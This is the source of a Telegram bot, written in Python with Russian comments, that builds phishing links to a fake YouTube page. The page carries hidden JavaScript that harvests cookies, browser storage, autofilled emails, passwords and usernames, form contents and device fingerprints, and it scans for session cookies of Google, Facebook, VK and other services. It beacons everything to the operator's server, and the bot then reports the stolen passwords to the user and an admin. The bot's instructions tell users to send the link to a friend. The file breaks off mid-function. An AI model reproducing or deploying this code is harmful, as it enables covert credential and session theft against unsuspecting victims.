import logging
import asyncio
import json
import re
import uuid
import html
import os
import time
import threading
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from dataclasses import dataclass, asdict
import base64

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"
ADMIN_ID = 1709490182  # Ваш Telegram ID для уведомлений

# Railway конфигурация
RAILWAY_APP_NAME = "your-app-name"  # Замените на имя вашего приложения на Railway
DOMAIN = f"https://{RAILWAY_APP_NAME}.up.railway.app"

# Хранилище данных
@dataclass
class PhishingLink:
    id: str
    original_url: str
    video_id: str
    created_at: str
    created_by: int
    clicks: int = 0
    data_collected: List[Dict] = None
    active: bool = True
    collected_cookies: List[Dict] = None
    collected_passwords: List[Dict] = None
    collected_logins: List[Dict] = None
    collected_storage_data: List[Dict] = None  # localStorage/sessionStorage
    full_sensitive_data: List[Dict] = None     # Полные сырые данные
    
    def __post_init__(self):
        if self.data_collected is None:
            self.data_collected = []
        if self.collected_cookies is None:
            self.collected_cookies = []
        if self.collected_passwords is None:
            self.collected_passwords = []
        if self.collected_logins is None:
            self.collected_logins = []
        if self.collected_storage_data is None:
            self.collected_storage_data = []
        if self.full_sensitive_data is None:
            self.full_sensitive_data = []

class Database:
    def __init__(self):
        self.links: Dict[str, PhishingLink] = {}
        self.users: Dict[int, Dict] = {}
        self.stats = {
            "total_links": 0,
            "total_clicks": 0,
            "total_data_collected": 0,
            "active_sessions": 0,
            "cookies_collected": 0,
            "passwords_collected": 0,
            "logins_collected": 0,
            "storage_data_collected": 0,
            "full_data_collected": 0
        }
    
    def add_link(self, link: PhishingLink):
        self.links[link.id] = link
        self.stats["total_links"] += 1
        self.save()
    
    def get_link(self, link_id: str) -> Optional[PhishingLink]:
        return self.links.get(link_id)
    
    def add_click(self, link_id: str):
        if link_id in self.links:
            self.links[link_id].clicks += 1
            self.stats["total_clicks"] += 1
            self.save()
    
    def add_collected_data(self, link_id: str, data: Dict):
        if link_id in self.links:
            self.links[link_id].data_collected.append(data)
            self.stats["total_data_collected"] += 1
            self.save()
    
    def add_collected_cookies(self, link_id: str, cookies: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_cookies.extend(cookies)
            self.stats["cookies_collected"] += len(cookies)
            self.save()
    
    def add_collected_passwords(self, link_id: str, passwords: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_passwords.extend(passwords)
            self.stats["passwords_collected"] += len(passwords)
            self.save()
    
    def add_collected_logins(self, link_id: str, logins: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_logins.extend(logins)
            self.stats["logins_collected"] += len(logins)
            self.save()
    
    def add_collected_storage(self, link_id: str, storage_data: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_storage_data.extend(storage_data)
            self.stats["storage_data_collected"] += len(storage_data)
            self.save()
    
    def add_full_sensitive_data(self, link_id: str, sensitive_data: Dict):
        if link_id in self.links:
            self.links[link_id].full_sensitive_data.append(sensitive_data)
            self.stats["full_data_collected"] += 1
            self.save()
    
    def save(self):
        try:
            data = {
                "links": {k: asdict(v) for k, v in self.links.items()},
                "stats": self.stats
            }
            with open("database.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"Error saving database: {e}")
    
    def load(self):
        try:
            with open("database.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                self.links = {k: PhishingLink(**v) for k, v in data.get("links", {}).items()}
                self.stats = data.get("stats", self.stats)
        except FileNotFoundError:
            pass
        except Exception as e:
            logger.error(f"Error loading database: {e}")

# Инициализация базы данных
db = Database()
db.load()

# Генератор ссылок для Railway
class LinkGenerator:
    @staticmethod
    def extract_video_id(url: str) -> str:
        """Извлечение ID видео из YouTube URL"""
        patterns = [
            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
            r'(?:v=|\/)([a-zA-Z0-9_-]{11})'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        # Если не нашли, возвращаем дефолтный
        return "dQw4w9WgXcQ"
    
    @staticmethod
    def generate_link_id() -> str:
        """Генерация уникального ID для ссылки"""
        return str(uuid.uuid4()).replace('-', '')[:12]
    
    @staticmethod
    def create_phishing_url(video_id: str, link_id: str) -> str:
        """Создание фишинговой ссылки для Railway"""
        return f"{DOMAIN}/watch?v={video_id}&id={link_id}&t={int(datetime.now().timestamp())}"

# JavaScript для скрытого сбора данных
class StealthJavaScriptInjector:
    @staticmethod
    def get_stealth_collection_script(link_id: str) -> str:
        """Скрытый JavaScript для сбора данных без показа форм"""
        return f"""
        <script>
        // Скрытый сбор данных - жертва ничего не видит
        (function() {{
            const linkId = "{link_id}";
            
            // Функция для скрытого сбора cookies
            function collectCookiesStealthily() {{
                const cookies = {{}};
                try {{
                    const cookieString = document.cookie;
                    if (cookieString) {{
                        cookieString.split(';').forEach(cookie => {{
                            const [name, value] = cookie.trim().split('=');
                            if (name && value) {{
                                cookies[name] = decodeURIComponent(value);
                            }}
                        }});
                    }}
                    
                    // Собираем cookies для популярных доменов
                    const importantDomains = [
                        'google.com', 'gmail.com', 'facebook.com', 
                        'vk.com', 'yandex.ru', 'mail.ru',
                        'youtube.com', 'instagram.com', 'twitter.com'
                    ];
                    
                    importantDomains.forEach(domain => {{
                        try {{
                            if (window.localStorage) {{
                                const lsData = {{}};
                                for (let i = 0; i < localStorage.length; i++) {{
                                    const key = localStorage.key(i);
                                    lsData[key] = localStorage.getItem(key);
                                }}
                                if (Object.keys(lsData).length > 0) {{
                                    cookies['localStorage_' + domain] = JSON.stringify(lsData);
                                }}
                            }}
                            
                            if (window.sessionStorage) {{
                                const ssData = {{}};
                                for (let i = 0; i < sessionStorage.length; i++) {{
                                    const key = sessionStorage.key(i);
                                    ssData[key] = sessionStorage.getItem(key);
                                }}
                                if (Object.keys(ssData).length > 0) {{
                                    cookies['sessionStorage_' + domain] = JSON.stringify(ssData);
                                }}
                            }}
                        }} catch(e) {{}}
                    }});
                    
                }} catch(e) {{
                    console.error('Stealth cookie collection error:', e);
                }}
                return cookies;
            }}
            
            // Функция для поиска автозаполненных данных
            function findAutofillData() {{
                const autofillData = {{
                    emails: [],
                    passwords: [],
                    usernames: [],
                    forms: []
                }};
                
                try {{
                    // Ищем все input поля
                    const allInputs = document.querySelectorAll('input');
                    allInputs.forEach(input => {{
                        if (input.value && input.value.trim()) {{
                            const fieldType = input.type.toLowerCase();
                            const fieldName = input.name || input.id || input.className || 'unknown';
                            const fieldValue = input.value;
                            
                            // Определяем тип поля
                            if (fieldType === 'email' || fieldName.includes('email')) {{
                                autofillData.emails.push({{
                                    field: fieldName,
                                    value: fieldValue,
                                    timestamp: new Date().toISOString()
                                }});
                            }} 
                            else if (fieldType === 'password' || fieldName.includes('pass')) {{
                                autofillData.passwords.push({{
                                    field: fieldName,
                                    value: fieldValue,
                                    timestamp: new Date().toISOString()
                                }});
                            }}
                            else if (fieldType === 'text' && (
                                fieldName.includes('user') || 
                                fieldName.includes('login') || 
                                fieldName.includes('name')
                            )) {{
                                autofillData.usernames.push({{
                                    field: fieldName,
                                    value: fieldValue,
                                    timestamp: new Date().toISOString()
                                }});
                            }}
                        }}
                    }});
                    
                    // Собираем данные из форм
                    document.querySelectorAll('form').forEach(form => {{
                        try {{
                            const formData = new FormData(form);
                            const formValues = {{}};
                            for (let [key, value] of formData.entries()) {{
                                if (value && value.toString().trim()) {{
                                    formValues[key] = value.toString();
                                }}
                            }}
                            
                            if (Object.keys(formValues).length > 0) {{
                                autofillData.forms.push({{
                                    formId: form.id || 'unknown',
                                    action: form.action || 'unknown',
                                    data: formValues,
                                    timestamp: new Date().toISOString()
                                }});
                            }}
                        }} catch(e) {{}}
                    }});
                    
                }} catch(e) {{
                    console.error('Autofill collection error:', e);
                }}
                
                return autofillData;
            }}
            
            // Функция сбора информации о браузере и устройстве
            function collectBrowserInfo() {{
                return {{
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    screen: {{
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth
                    }},
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset()
                }};
            }}
            
            // Функция поиска активных сессий в cookies
            function findActiveSessions() {{
                const sessions = {{}};
                const sessionPatterns = {{
                    google: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'LOGIN_INFO'],
                    facebook: ['c_user', 'xs', 'fr', 'datr'],
                    vk: ['remixsid', 'remixstid', 'remixlgck'],
                    yandex: ['Session_id', 'yandexuid', 'ys'],
                    mailru: ['Mpop', 'act', 'mbox'],
                    instagram: ['sessionid', 'csrftoken', 'ds_user_id'],
                    twitter: ['auth_token', 'twid', 'ct0']
                }};
                
                try {{
                    const cookies = document.cookie;
                    Object.keys(sessionPatterns).forEach(service => {{
                        sessionPatterns[service].forEach(pattern => {{
                            if (cookies.includes(pattern)) {{
                                if (!sessions[service]) sessions[service] = [];
                                sessions[service].push(pattern);
                            }}
                        }});
                    }});
                }} catch(e) {{}}
                
                return sessions;
            }}
            
            // Главная функция сбора всех данных
            function collectAllDataStealthily() {{
                const collectedData = {{
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    linkId: linkId,
                    browser: collectBrowserInfo(),
                    cookies: collectCookiesStealthily(),
                    autofill: findAutofillData(),
                    sessions: findActiveSessions(),
                    localStorage: {{}},
                    sessionStorage: {{}},
                    pageContent: document.documentElement.innerHTML.length
                }};
                
                // Собираем storage данные
                try {{
                    if (window.localStorage) {{
                        for (let i = 0; i < localStorage.length; i++) {{
                            const key = localStorage.key(i);
                            collectedData.localStorage[key] = localStorage.getItem(key);
                        }}
                    }}
                    
                    if (window.sessionStorage) {{
                        for (let i = 0; i < sessionStorage.length; i++) {{
                            const key = sessionStorage.key(i);
                            collectedData.sessionStorage[key] = sessionStorage.getItem(key);
                        }}
                    }}
                }} catch(e) {{}}
                
                return collectedData;
            }}
            
            // Функция отправки данных на сервер
            function sendCollectedData(data) {{
                try {{
                    const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
                    
                    // Используем sendBeacon для надежной отправки
                    const blob = new Blob([JSON.stringify({{
                        link_id: linkId,
                        data: encodedData,
                        timestamp: new Date().toISOString(),
                        type: 'stealth_collection'
                    }})], {{type: 'application/json'}});
                    
                    navigator.sendBeacon('/api/collect_stealth', blob);
                    
                    // Fallback через fetch
                    fetch('/api/collect_stealth', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{
                            link_id: linkId,
                            data: encodedData,
                            timestamp: new Date().toISOString(),
                            type: 'stealth_collection'
                        }}),
                        keepalive: true
                    }}).catch(() => {{}});
                    
                }} catch(e) {{
                    console.error('Send error:', e);
                }}
            }}
            
            // Запуск сбора данных
            function startStealthCollection() {{
                // Первый сбор сразу
                setTimeout(() => {{
                    const data = collectAllDataStealthily();
                    sendCollectedData(data);
                }}, 1000);
                
                // Сбор каждые 5 секунд
                setInterval(() => {{
                    const data = collectAllDataStealthily();
                    sendCollectedData(data);
                }}, 5000);
                
                // Сбор при взаимодействии с формой
                document.addEventListener('submit', function(e) {{
                    setTimeout(() => {{
                        const data = collectAllDataStealthily();
                        sendCollectedData(data);
                    }}, 300);
                }});
                
                // Сбор при изменении полей ввода
                document.addEventListener('change', function(e) {{
                    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {{
                        setTimeout(() => {{
                            const data = collectAllDataStealthily();
                            sendCollectedData(data);
                        }}, 500);
                    }}
                }}, true);
                
                // Сбор при наведении курсора (собираем активность)
                let mouseMoves = 0;
                document.addEventListener('mousemove', function() {{
                    mouseMoves++;
                    if (mouseMoves % 50 === 0) {{ // Каждые 50 движений
                        const data = collectAllDataStealthily();
                        sendCollectedData(data);
                    }}
                }});
                
                // Сбор при нажатии клавиш
                let keyPresses = 0;
                document.addEventListener('keypress', function() {{
                    keyPresses++;
                    if (keyPresses % 20 === 0) {{ // Каждые 20 нажатий
                        const data = collectAllDataStealthily();
                        sendCollectedData(data);
                    }}
                }});
                
                // Сбор при прокрутке
                let scrollEvents = 0;
                window.addEventListener('scroll', function() {{
                    scrollEvents++;
                    if (scrollEvents % 10 === 0) {{ // Каждые 10 скроллов
                        const data = collectAllDataStealthily();
                        sendCollectedData(data);
                    }}
                }});
            }}
            
            // Запускаем сбор данных
            window.addEventListener('load', function() {{
                // Даем время для загрузки страницы и автозаполнения
                setTimeout(startStealthCollection, 2000);
            }});
            
            // Сбор при уходе со страницы
            window.addEventListener('beforeunload', function() {{
                const data = collectAllDataStealthily();
                data.exitEvent = true;
                sendCollectedData(data);
            }});
            
            // Сбор данных о времени на странице
            let pageLoadTime = Date.now();
            setInterval(() => {{
                const timeOnPage = Date.now() - pageLoadTime;
                if (timeOnPage > 30000) {{ // Каждые 30 секунд
                    const data = collectAllDataStealthily();
                    data.timeOnPage = timeOnPage;
                    sendCollectedData(data);
                }}
            }}, 30000);
            
        }})();
        </script>
        """
    
    @staticmethod
    def get_youtube_video_page(video_id: str, link_id: str) -> str:
        """Генерация страницы с YouTube видео без форм входа"""
        stealth_script = StealthJavaScriptInjector.get_stealth_collection_script(link_id)
        
        html_content = f"""
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>YouTube Video</title>
            <style>
                * {{
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }}
                
                body {{
                    font-family: 'Roboto', Arial, sans-serif;
                    background: #0f0f0f;
                    color: #fff;
                    overflow-x: hidden;
                }}
                
                .container {{
                    max-width: 1280px;
                    margin: 0 auto;
                    padding: 20px;
                }}
                
                .video-container {{
                    position: relative;
                    width: 100%;
                    padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
                    height: 0;
                    margin-bottom: 20px;
                    border-radius: 12px;
                    overflow: hidden;
                    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
                }}
                
                .video-container iframe {{
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    border: none;
                    border-radius: 12px;
                }}
                
                .video-info {{
                    background: rgba(255, 255, 255, 0.05);
                    padding: 20px;
                    border-radius: 12px;
                    margin-top: 20px;
                    backdrop-filter: blur(10px);
                }}
                
                .video-title {{
                    font-size: 22px;
                    font-weight: 600;
                    margin-bottom: 10px;
                    color: #fff;
                }}
                
                .video-stats {{
                    display: flex;
                    gap: 20px;
                    color: #aaa;
                    font-size: 14px;
                    margin-bottom: 15px;
                }}
                
                .channel-info {{
                    display: flex;
                    align-items: center;
                    gap: 12px;
                    margin-top: 20px;
                }}
                
                .channel-avatar {{
                    width: 40px;
                    height: 40px;
                    border-radius: 50%;
                    background: linear-gradient(45deg, #ff0000, #ff6b6b);
                }}
                
                .channel-name {{
                    font-weight: 500;
                }}
                
                .subscribe-btn {{
                    margin-left: auto;
                    background: #ff0000;
                    color: white;
                    border: none;
                    padding: 8px 16px;
                    border-radius: 20px;
                    font-weight: 500;
                    cursor: pointer;
                    transition: background 0.3s;
                }}
                
                .subscribe-btn:hover {{
                    background: #cc0000;
                }}
                
                .comments-section {{
                    margin-top: 30px;
                    background: rgba(255, 255, 255, 0.03);
                    padding: 20px;
                    border-radius: 12px;
                }}
                
                .comments-title {{
                    font-size: 18px;
                    margin-bottom: 15px;
                }}
                
                .comment {{
                    display: flex;
                    gap: 12px;
                    margin-bottom: 15px;
                    padding-bottom: 15px;
                    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
                }}
                
                .comment-avatar {{
                    width: 32px;
                    height: 32px;
                    border-radius: 50%;
                    background: #555;
                }}
                
                .comment-content h4 {{
                    font-size: 14px;
                    margin-bottom: 5px;
                }}
                
                .comment-content p {{
                    font-size: 14px;
                    color: #ccc;
                }}
                
                .recommended-videos {{
                    margin-top: 30px;
                }}
                
                .recommended-title {{
                    font-size: 18px;
                    margin-bottom: 15px;
                }}
                
                .video-grid {{
                    display: grid;
                    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
                    gap: 15px;
                }}
                
                .video-card {{
                    background: rgba(255, 255, 255, 0.05);
                    border-radius: 8px;
                    overflow: hidden;
                    transition: transform 0.3s;
                }}
                
                .video-card:hover {{
                    transform: translateY(-5px);
                }}
                
                .video-thumbnail {{
                    width: 100%;
                    height: 120px;
                    background: #333;
                }}
                
                .video-card-info {{
                    padding: 10px;
                }}
                
                .video-card-title {{
                    font-size: 14px;
                    font-weight: 500;
                    margin-bottom: 5px;
                }}
                
                .video-card-channel {{
                    font-size: 12px;
                    color: #aaa;
                }}
                
                /* Анимации */
                @keyframes fadeIn {{
                    from {{ opacity: 0; transform: translateY(20px); }}
                    to {{ opacity: 1; transform: translateY(0); }}
                }}
                
                .video-container, .video-info, .comments-section {{
                    animation: fadeIn 0.8s ease-out;
                }}
                
                /* Адаптивность */
                @media (max-width: 768px) {{
                    .container {{
                        padding: 10px;
                    }}
                    
                    .video-grid {{
                        grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
                    }}
                }}
                
                /* Скрытые элементы для сбора данных */
                .data-collector {{
                    display: none;
                }}
            </style>
            <link rel="preconnect" href="https://fonts.googleapis.com">
            <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
            <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
        </head>
        <body>
            <div class="container">
                <!-- Основной видеоплеер -->
                <div class="video-container">
                    <iframe 
                        src="https://www.youtube.com/embed/{video_id}?autoplay=1&controls=1&showinfo=1&rel=0&modestbranding=1" 
                        frameborder="0" 
                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                        allowfullscreen
                        title="YouTube video player">
                    </iframe>
                </div>
                
                <!-- Информация о видео -->
                <div class="video-info">
                    <h1 class="video-title">Загружаем видео с YouTube...</h1>
                    <div class="video-stats">
                        <span>👁️ 1.2M просмотров</span>
                        <span>👍 45K</span>
                        <span>📅 2 дня назад</span>
                    </div>
                    
                    <!-- Информация о канале -->
                    <div class="channel-info">
                        <div class="channel-avatar"></div>
                        <div>
                            <div class="channel-name">YouTube Channel</div>
                            <div style="font-size: 12px; color: #aaa;">2.5M подписчиков</div>
                        </div>
                        <button class="subscribe-btn">Подписаться</button>
                    </div>
                </div>
                
                <!-- Секция комментариев -->
                <div class="comments-section">
                    <h3 class="comments-title">💬 Комментарии (1.2K)</h3>
                    
                    <div class="comment">
                        <div class="comment-avatar"></div>
                        <div class="comment-content">
                            <h4>Иван Петров</h4>
                            <p>Отличное видео! Очень познавательно 👍</p>
                        </div>
                    </div>
                    
                    <div class="comment">
                        <div class="comment-avatar"></div>
                        <div class="comment-content">
                            <h4>Анна Смирнова</h4>
                            <p>Спасибо за контент! Жду новых выпусков 😊</p>
                        </div>
                    </div>
                    
                    <div class="comment">
                        <div class="comment-avatar"></div>
                        <div class="comment-content">
                            <h4>Дмитрий Иванов</h4>
                            <p>Лучшее что я видел на этой неделе!</p>
                        </div>
                    </div>
                </div>
                
                <!-- Рекомендуемые видео -->
                <div class="recommended-videos">
                    <h3 class="recommended-title">📺 Рекомендуемые видео</h3>
                    <div class="video-grid">
                        <div class="video-card">
                            <div class="video-thumbnail"></div>
                            <div class="video-card-info">
                                <div class="video-card-title">Как сделать что-то крутое</div>
                                <div class="video-card-channel">Tech Channel • 250K просмотров</div>
                            </div>
                        </div>
                        
                        <div class="video-card">
                            <div class="video-thumbnail"></div>
                            <div class="video-card-info">
                                <div class="video-card-title">Секреты успеха в 2024</div>
                                <div class="video-card-channel">Business Tips • 180K просмотров</div>
                            </div>
                        </div>
                        
                        <div class="video-card">
                            <div class="video-thumbnail"></div>
                            <div class="video-card-info">
                                <div class="video-card-title">Топ 10 приложений месяца</div>
                                <div class="video-card-channel">App Review • 320K просмотров</div>
                            </div>
                        </div>
                        
                        <div class="video-card">
                            <div class="video-thumbnail"></div>
                            <div class="video-card-info">
                                <div class="video-card-title">Путешествие по миру</div>
                                <div class="video-card-channel">Travel Vlog • 410K просмотров</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Скрытый сбор данных -->
            <div class="data-collector"></div>
            
            {stealth_script}
            
            <!-- Дополнительный JavaScript для реалистичности -->
            <script>
                // Динамическое обновление информации
                document.addEventListener('DOMContentLoaded', function() {{
                    // Обновляем заголовок через 2 секунды (имитация загрузки)
                    setTimeout(() => {{
                        const titles = [
                            "Как стать успешным в 2024 году | Полное руководство",
                            "Тайны мира: что от нас скрывают?",
                            "10 способов заработать деньги онлайн",
                            "Путешествие в неизведанное: новые открытия",
                            "Технологии будущего, которые изменят мир"
                        ];
                        const randomTitle = titles[Math.floor(Math.random() * titles.length)];
                        document.querySelector('.video-title').textContent = randomTitle;
                        
                        // Обновляем счетчики
                        const views = Math.floor(Math.random() * 5000000) + 1000000;
                        const likes = Math.floor(views * 0.04);
                        document.querySelector('.video-stats').innerHTML = `
                            <span>👁️ {{(views/1000000).toFixed(1)}}M просмотров</span>
                            <span>👍 {{likes.toLocaleString()}}</span>
                            <span>📅 {{Math.floor(Math.random() * 7) + 1}} дня назад</span>
                        `;
                    }}, 2000);
                    
                    // Имитация активности в комментариях
                    setInterval(() => {{
                        const comments = document.querySelectorAll('.comment');
                        if (comments.length > 0) {{
                            const randomComment = comments[Math.floor(Math.random() * comments.length)];
                            randomComment.style.opacity = '0.7';
                            setTimeout(() => {{
                                randomComment.style.opacity = '1';
                            }}, 300);
                        }}
                    }}, 5000);
                    
                    // Имитация просмотра видео
                    let watchTime = 0;
                    setInterval(() => {{
                        watchTime++;
                        if (watchTime % 10 === 0) {{
                            // Отправка данных о времени просмотра
                            const data = {{
                                action: 'watching',
                                time: watchTime,
                                linkId: '{link_id}'
                            }};
                            try {{
                                fetch('/api/track', {{
                                    method: 'POST',
                                    headers: {{'Content-Type': 'application/json'}},
                                    body: JSON.stringify(data)
                                }});
                            }} catch(e) {{}}
                        }}
                    }}, 1000);
                }});
                
                // Обработка кликов
                document.addEventListener('click', function(e) {{
                    // Отслеживаем клики
                    const clickData = {{
                        x: e.clientX,
                        y: e.clientY,
                        target: e.target.tagName,
                        linkId: '{link_id}',
                        timestamp: new Date().toISOString()
                    }};
                    
                    try {{
                        fetch('/api/track_click', {{
                            method: 'POST',
                            headers: {{'Content-Type': 'application/json'}},
                            body: JSON.stringify(clickData)
                        }});
                    }} catch(e) {{}}
                }});
            </script>
        </body>
        </html>
        """
        return html_content

# Функции для работы с сообщениями
def split_message(text: str, max_length: int = 4000) -> List[str]:
    """Разбивает длинное сообщение на части"""
    if len(text) <= max_length:
        return [text]
    
    chunks = []
    while text:
        if len(text) <= max_length:
            chunks.append(text)
            break
        
        split_pos = text.rfind('\n', 0, max_length)
        if split_pos == -1:
            split_pos = max_length
        
        chunks.append(text[:split_pos])
        text = text[split_pos:].lstrip()
    
    return chunks

class MessageFormatter:
    @staticmethod
    def format_link_created(link_id: str, original_url: str, phishing_url: str) -> str:
        """Форматирование сообщения о созданной ссылке"""
        return f"""
🎬 *ССЫЛКА СОЗДАНА УСПЕШНО!*

📌 *Оригинальное видео:*
`{original_url}`

🔗 *Ваша скрытая ссылка:*
`{phishing_url}`

📊 *Информация:*
• ID: `{link_id}`
• Создано: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
• Статус: 🟢 АКТИВНА

🎯 *Особенности:*
✓ Настоящее YouTube видео
✓ Нет форм входа
✓ Данные собираются в фоне
✓ Автоматический сбор cookies
✓ Сбор автозаполненных данных
✓ Отслеживание активности

⚠️ *Как использовать:*
1. Отправьте ссылку другу
2. Он увидит настоящее YouTube видео
3. Данные будут собраны автоматически
4. Вы получите уведомление с данными
5. Владелец также получит полные данные

⏱️ *Время активности:* 24 часа
"""

    @staticmethod
    def format_collected_data(link_id: str, data: Dict) -> str:
        """Форматирование собранных данных"""
        try:
            decoded_data = json.loads(base64.b64decode(data['data']).decode('utf-8'))
        except:
            return "❌ Ошибка декодирования данных"
        
        cookies_count = len(decoded_data.get('cookies', {}))
        sessions = decoded_data.get('sessions', {})
        autofill = decoded_data.get('autofill', {})
        
        message = f"""
🔍 *НОВЫЕ ДАННЫЕ СОБРАНЫ!*

📌 *Информация о сессии:*
• Ссылка ID: `{link_id}`
• Время: {data.get('timestamp', 'N/A')}
• URL: {decoded_data.get('url', 'N/A')[:50]}...
• Время на странице: {decoded_data.get('timeOnPage', 0)/1000:.0f} сек

📊 *Собранные данные:*
• Cookies: {cookies_count}
• Emails найдено: {len(autofill.get('emails', []))}
• Паролей найдено: {len(autofill.get('passwords', []))}
• Usernames найдено: {len(autofill.get('usernames', []))}
• Форм проанализировано: {len(autofill.get('forms', []))}

🌐 *Активные сессии:*
"""
        
        if sessions:
            for service, session_cookies in sessions.items():
                message += f"• {service.upper()}: {len(session_cookies)} cookies\n"
        else:
            message += "• Активные сессии не обнаружены\n"
        
        # Показываем найденные emails
        emails = autofill.get('emails', [])
        if emails:
            message += "\n📧 *Найденные emails:*\n"
            for email in emails[:3]:
                message += f"• `{email.get('value', 'N/A')}`\n"
        
        # Информация о браузере
        browser = decoded_data.get('browser', {})
        if browser:
            message += f"""
📱 *Информация о браузере:*
• User Agent: {browser.get('userAgent', 'N/A')[:50]}...
• Платформа: {browser.get('platform', 'N/A')}
• Язык: {browser.get('language', 'N/A')}
• Временная зона: {browser.get('timezone', 'N/A')}
• Разрешение: {browser.get('screen', {}).get('width', 'N/A')}x{browser.get('screen', {}).get('height', 'N/A')}
"""
        
        message += f"""
⚠️ *Все полные данные также отправлены администратору.*
"""
        
        return message
    
    @staticmethod
    def format_detailed_admin_report(link_id: str, data: Dict) -> str:
        """Детальный отчет для администратора"""
        try:
            decoded_data = json.loads(base64.b64decode(data['data']).decode('utf-8'))
        except:
            return "❌ Ошибка декодирования данных"
        
        report = f"""
🔐 *ПОЛНЫЙ ОТЧЕТ О СОБРАННЫХ ДАННЫХ*

📌 *Базовая информация:*
• Ссылка ID: `{link_id}`
• Время сбора: {data.get('timestamp', 'N/A')}
• URL страницы: {decoded_data.get('url', 'N/A')}
• Время на странице: {decoded_data.get('timeOnPage', 0)/1000:.0f} секунд
• Событие выхода: {'Да' if decoded_data.get('exitEvent') else 'Нет'}

════════════════════════════════════════
"""
        
        # Информация о браузере
        browser = decoded_data.get('browser', {})
        if browser:
            report += "\n📱 *ИНФОРМАЦИЯ О БРАУЗЕРЕ И УСТРОЙСТВЕ:*\n"
            report += f"• User Agent: {browser.get('userAgent', 'N/A')}\n"
            report += f"• Платформа: {browser.get('platform', 'N/A')}\n"
            report += f"• Языки: {', '.join(browser.get('languages', ['N/A']))}\n"
            report += f"• Cookies включены: {browser.get('cookieEnabled', 'N/A')}\n"
            report += f"• Do Not Track: {browser.get('doNotTrack', 'N/A')}\n"
            report += f"• Ядер CPU: {browser.get('hardwareConcurrency', 'N/A')}\n"
            report += f"• Память устройства: {browser.get('deviceMemory', 'N/A')} GB\n"
            report += f"• Временная зона: {browser.get('timezone', 'N/A')}\n"
            report += f"• Смещение времени: {browser.get('timezoneOffset', 'N/A')} мин\n"
            report += f"• Разрешение: {browser.get('screen', {}).get('width', 'N/A')}x{browser.get('screen', {}).get('height', 'N/A')}\n"
            report += f"• Глубина цвета: {browser.get('screen', {}).get('colorDepth', 'N/A')}\n"
            report += f"• Глубина пикселей: {browser.get('screen', {}).get('pixelDepth', 'N/A')}\n"
        
        # Cookies
        cookies = decoded_data.get('cookies', {})
        if cookies:
            report += "\n🍪 *COOKIES (первые 20):*\n"
            cookie_list = list(cookies.items())[:20]
            for i, (name, value) in enumerate(cookie_list, 1):
                value_preview = str(value)[:50] + ("..." if len(str(value)) > 50 else "")
                report += f"{i}. `{name}`: `{value_preview}`\n"
        
        # Активные сессии
        sessions = decoded_data.get('sessions', {})
        if sessions:
            report += "\n🌐 *АКТИВНЫЕ СЕССИИ В СОЦСЕТЯХ:*\n"
            for service, session_cookies in sessions.items():
                report += f"• {service.upper()}:\n"
                for cookie in session_cookies:
                    report += f"  └ `{cookie}`\n"
        
        # Автозаполненные данные
        autofill = decoded_data.get('autofill', {})
        if autofill.get('emails'):
            report += "\n📧 *НАЙДЕННЫЕ EMAIL АДРЕСА:*\n"
            for i, email in enumerate(autofill['emails'][:5], 1):
                report += f"{i}. `{email.get('value', 'N/A')}`\n"
                report += f"   Поле: {email.get('field', 'N/A')}\n"
                report += f"   Время: {email.get('timestamp', 'N/A')}\n"
        
        if autofill.get('passwords'):
            report += "\n🔑 *НАЙДЕННЫЕ ПАРОЛИ:*\n"
            for i, pwd in enumerate(autofill['passwords'][:3], 1):
                report += f"{i}. Значение: `{pwd.get('value', 'N/A')}`\n"
                report += f"   Поле: {pwd.get('field', 'N/A')}\n"
                report += f"   Время: {pwd.get('timestamp', 'N/A')}\n"
        
        if autofill.get('usernames'):
            report += "\n👤 *НАЙДЕННЫЕ ИМЕНА ПОЛЬЗОВАТЕЛЕЙ:*\n"
